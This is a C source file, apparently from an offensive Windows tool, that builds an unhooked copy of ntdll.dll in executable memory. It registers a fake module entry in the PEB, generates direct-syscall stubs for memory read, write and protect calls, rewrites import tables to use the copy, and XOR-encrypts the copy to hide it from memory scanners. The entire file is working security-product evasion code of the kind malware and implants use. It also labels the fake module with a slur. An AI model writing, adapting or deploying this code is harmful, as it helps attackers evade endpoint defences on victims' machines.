#include "cleany.h"
#include <stdio.h>
#include <bcrypt.h>

#ifndef RemoveEntryList
#define RemoveEntryList(Entry) \
    (Entry)->Blink->Flink = (Entry)->Flink; \
    (Entry)->Flink->Blink = (Entry)->Blink;
#endif

#ifndef InsertHeadList
#define InsertHeadList(ListHead, Entry)  \
    do {                                 \
        (Entry)->Flink = (ListHead)->Flink;   \
        (Entry)->Blink = (ListHead);          \
        (ListHead)->Flink->Blink = (Entry);   \
        (ListHead)->Flink = (Entry);          \
    } while (0)
#endif

static const BYTE SYSCALL_STUB_TEMPLATE[] = {
    0x49, 0x89, 0xCA,       
    0xB8, 0x00, 0x00, 0x00, 0x00,  
    0x0F, 0x05,             
    0xC3                    
};

BOOL AddCleanCopyToPEB(PCLEAN_COPY_INFO info) {
    printf("[*] Registering clean copy in PEB...\n");
    fflush(stdout);

    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*ldr));
    if (!ldr) {
        printf("[-] Failed to allocate LDR entry (err=%lu)\n", GetLastError());
        return FALSE;
    }

    ldr->DllBase = info->CleanCopyBase;
    RtlInitUnicodeString(&ldr->FullDllName, L"<retarded-ntdll>");

    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA ldrd = pPeb->Ldr;
    InsertHeadList(&ldrd->InMemoryOrderModuleList, &ldr->InMemoryOrderLinks);

    info->FakeLdrEntry = ldr;
    printf("[+] Clean copy registered in PEB\n");
    fflush(stdout);
    return TRUE;
}

BOOL InitializeCleanCopy(PCLEAN_COPY_INFO info) {
    info->OriginalModule = GetModuleHandleW(L"ntdll.dll");
    if (!info->OriginalModule) {
        wprintf(L"[-] Failed to get ntdll.dll base address\n");
        return FALSE;
    }
    wprintf(L"[+] Found ntdll.dll at %p\n", info->OriginalModule);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)info->OriginalModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)info->OriginalModule + 
                                                      pDosHeader->e_lfanew);
    
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    wprintf(L"[*] Allocating %zu bytes for clean copy\n", imageSize);
    info->CleanCopyBase = VirtualAlloc(NULL,
                                      imageSize,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!info->CleanCopyBase) {
        wprintf(L"[-] Failed to allocate memory for clean copy (err=%lu)\n", GetLastError());
        return FALSE;
    }
    wprintf(L"[+] Allocated clean copy buffer at %p\n", info->CleanCopyBase);

    SIZE_T headerSize = pNtHeaders->OptionalHeader.SizeOfHeaders;
    wprintf(L"[*] Copying %zu bytes of headers\n", headerSize);
    memcpy(info->CleanCopyBase,
           info->OriginalModule,
           headerSize);

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        wprintf(L"[*] Copying section %.*hs (VA: %p, Size: %lu)\n",
               (int)sizeof(pSectionHeader[i].Name),
               pSectionHeader[i].Name,
               (BYTE*)info->CleanCopyBase + pSectionHeader[i].VirtualAddress,
               pSectionHeader[i].SizeOfRawData);

        if (pSectionHeader[i].SizeOfRawData == 0) {
            wprintf(L"[*]   - Section has no raw data, skipping\n");
            continue;
        }

        memcpy((BYTE*)info->CleanCopyBase + pSectionHeader[i].VirtualAddress,
               (BYTE*)info->OriginalModule + pSectionHeader[i].VirtualAddress,
               pSectionHeader[i].SizeOfRawData);
    }

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSectionHeader[i].Name, ".text", 5) == 0) {
            info->TextSectionBase = 
                (BYTE*)info->CleanCopyBase + pSectionHeader[i].VirtualAddress;
            info->TextSectionSize = pSectionHeader[i].SizeOfRawData;
            wprintf(L"[+] Found .text section at %p (size: %zu bytes)\n",
                   info->TextSectionBase,
                   info->TextSectionSize);
            break;
        }
    }

    info->CleanCopySize = imageSize;
    wprintf(L"[+] Successfully copied entire PE image (%zu bytes)\n", imageSize);

    if (!AddCleanCopyToPEB(info)) {
        wprintf(L"[-] Failed to register clean copy in PEB\n");
        return FALSE;
    }

    if (!GenerateSyscallStubs(info)) {
        return FALSE;
    }

    if (!EncryptCleanCopy(info)) {
        return FALSE;
    }

    return TRUE;
}

BOOL PatchIAT(PCLEAN_COPY_INFO CleanCopyInfo, LPCSTR FunctionName) {
    printf("[*] → Entered PatchIAT for %s\n", FunctionName);
    fflush(stdout);

    PVOID functionRVA = GetFunctionRVA(CleanCopyInfo->CleanCopyBase, FunctionName);
    printf("[*]   - GetFunctionRVA returned %p\n", functionRVA);
    fflush(stdout);
    if (!functionRVA) {
        printf("[-] Failed to find function RVA: %s\n", FunctionName);
        return FALSE;
    }

    PVOID functionAddress = (BYTE*)CleanCopyInfo->CleanCopyBase + 
                            ((BYTE*)functionRVA - (BYTE*)CleanCopyInfo->CleanCopyBase);
    printf("[*]   - Patching to address %p\n", functionAddress);
    fflush(stdout);

    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY pListHead = &pPeb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY pLE = pListHead->Flink; pLE != pListHead; pLE = pLE->Flink) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pLE, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pEntry->DllBase +
            ((PIMAGE_DOS_HEADER)pEntry->DllBase)->e_lfanew);
        DWORD importRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (importRVA == 0) {
            printf("[*]   - Module@%p has no imports, skipping\n", pEntry->DllBase);
            fflush(stdout);
            continue;  
        }

        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pEntry->DllBase + importRVA);
        for (; pImport->Name; pImport++) {
            LPCSTR impName = (LPCSTR)((BYTE*)pEntry->DllBase + pImport->Name);
            printf("[*]   - Checking import from %.*hs\n", (int)strlen(impName), impName);
            fflush(stdout);
            
            if (_stricmp(impName, "ntdll.dll")) continue;

            printf("[*]   - Found ntdll.dll import in module@%p\n", pEntry->DllBase);
            fflush(stdout);
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)pEntry->DllBase + pImport->FirstThunk);
            for (; pThunk->u1.Function; pThunk++) {
                PVOID *ppfn = (PVOID*)&pThunk->u1.Function;
                if (*ppfn == (PVOID)GetProcAddress(CleanCopyInfo->OriginalModule, FunctionName)) {
                    printf("[*]   - Found import in %p → rewriting\n", ppfn);
                    fflush(stdout);
                    DWORD oldProt;
                    if (!VirtualProtect(ppfn, sizeof(PVOID), PAGE_READWRITE, &oldProt)) {
                        printf("[-]   - VirtualProtect failed (err=%lu)\n", GetLastError());
                        return FALSE;
                    }
                    *ppfn = functionAddress;
                    if (!VirtualProtect(ppfn, sizeof(PVOID), oldProt, &oldProt)) {
                        printf("[-]   - VirtualProtect restore failed (err=%lu)\n", GetLastError());
                        return FALSE;
                    }
                    printf("[+]   - Patched %s in module@%p\n", FunctionName, pEntry->DllBase);
                    fflush(stdout);
                }
            }
        }
    }

    printf("[+] Successfully completed IAT patching for %s\n", FunctionName);
    fflush(stdout);
    return TRUE;
}

PVOID GetFunctionRVA(PVOID ModuleBase, LPCSTR FunctionName) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)ModuleBase + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)
        ((BYTE*)ModuleBase + 
         pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pFunctions = (PDWORD)((BYTE*)ModuleBase + pExportDir->AddressOfFunctions);
    PDWORD pNames = (PDWORD)((BYTE*)ModuleBase + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE*)ModuleBase + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR pszFunctionName = (LPCSTR)((BYTE*)ModuleBase + pNames[i]);
        if (strcmp(pszFunctionName, FunctionName) == 0) {
            return (BYTE*)ModuleBase + pFunctions[pOrdinals[i]];
        }
    }

    return NULL;
}

BOOL GenerateSyscallStubs(PCLEAN_COPY_INFO info) {
    printf("[*] Generating syscall stubs...\n");
    fflush(stdout);

    info->StubCount = 3;  
    info->Stubs = (PSYSCALL_STUB)VirtualAlloc(NULL, 
                                             sizeof(SYSCALL_STUB) * info->StubCount,
                                             MEM_COMMIT | MEM_RESERVE,
                                             PAGE_EXECUTE_READWRITE);
    if (!info->Stubs) {
        printf("[-] Failed to allocate memory for stubs (err=%lu)\n", GetLastError());
        return FALSE;
    }

    const char* functions[] = {
        "NtReadVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory"
    };

    for (DWORD i = 0; i < info->StubCount; i++) {
        info->Stubs[i].OriginalFunction = GetProcAddress(info->OriginalModule, functions[i]);
        if (!info->Stubs[i].OriginalFunction) {
            printf("[-] Failed to get address of %s (err=%lu)\n", functions[i], GetLastError());
            VirtualFree(info->Stubs, 0, MEM_RELEASE);
            info->Stubs = NULL;
            return FALSE;
        }

        memcpy(info->Stubs[i].Code, SYSCALL_STUB_TEMPLATE, SYSCALL_STUB_SIZE);

        info->Stubs[i].SyscallNumber = *(DWORD*)((BYTE*)info->Stubs[i].OriginalFunction + 4);

        *(DWORD*)(info->Stubs[i].Code + 4) = info->Stubs[i].SyscallNumber;

        printf("[+] Generated stub for %s (syscall: 0x%X)\n", 
               functions[i], info->Stubs[i].SyscallNumber);
        fflush(stdout);
    }

    return TRUE;
}

BOOL EncryptCleanCopy(PCLEAN_COPY_INFO CleanCopyInfo) {
    if (CleanCopyInfo->IsEncrypted) {
        return TRUE;
    }

    printf("[*] Encrypting clean copy...\n");
    fflush(stdout);

    if (!NT_SUCCESS(BCryptGenRandom(NULL, CleanCopyInfo->EncryptionKey, 
        sizeof(CleanCopyInfo->EncryptionKey), BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        printf("[-] Failed to generate encryption key\n");
        return FALSE;
    }

    for (SIZE_T i = 0; i < CleanCopyInfo->CleanCopySize; i++) {
        ((BYTE*)CleanCopyInfo->CleanCopyBase)[i] ^= 
            CleanCopyInfo->EncryptionKey[i % sizeof(CleanCopyInfo->EncryptionKey)];
    }

    CleanCopyInfo->IsEncrypted = TRUE;
    printf("[+] Clean copy encrypted\n");
    return TRUE;
}

BOOL DecryptCleanCopy(PCLEAN_COPY_INFO CleanCopyInfo) {
    if (!CleanCopyInfo->IsEncrypted) {
        return TRUE;
    }

    printf("[*] Decrypting clean copy...\n");
    fflush(stdout);

    for (SIZE_T i = 0; i < CleanCopyInfo->CleanCopySize; i++) {
        ((BYTE*)CleanCopyInfo->CleanCopyBase)[i] ^= 
            CleanCopyInfo->EncryptionKey[i % sizeof(CleanCopyInfo->EncryptionKey)];
    }

    CleanCopyInfo->IsEncrypted = FALSE;
    printf("[+] Clean copy decrypted\n");
    return TRUE;
}

void CleanupCleanCopy(PCLEAN_COPY_INFO info) {
    if (info->FakeLdrEntry) {
        HeapFree(GetProcessHeap(), 0, info->FakeLdrEntry);
        info->FakeLdrEntry = NULL;
    }
    if (info->Stubs) {
        VirtualFree(info->Stubs, 0, MEM_RELEASE);
        info->Stubs = NULL;
    }
    if (info->CleanCopyBase) {
        VirtualFree(info->CleanCopyBase, 0, MEM_RELEASE);
        info->CleanCopyBase = NULL;
    }
} 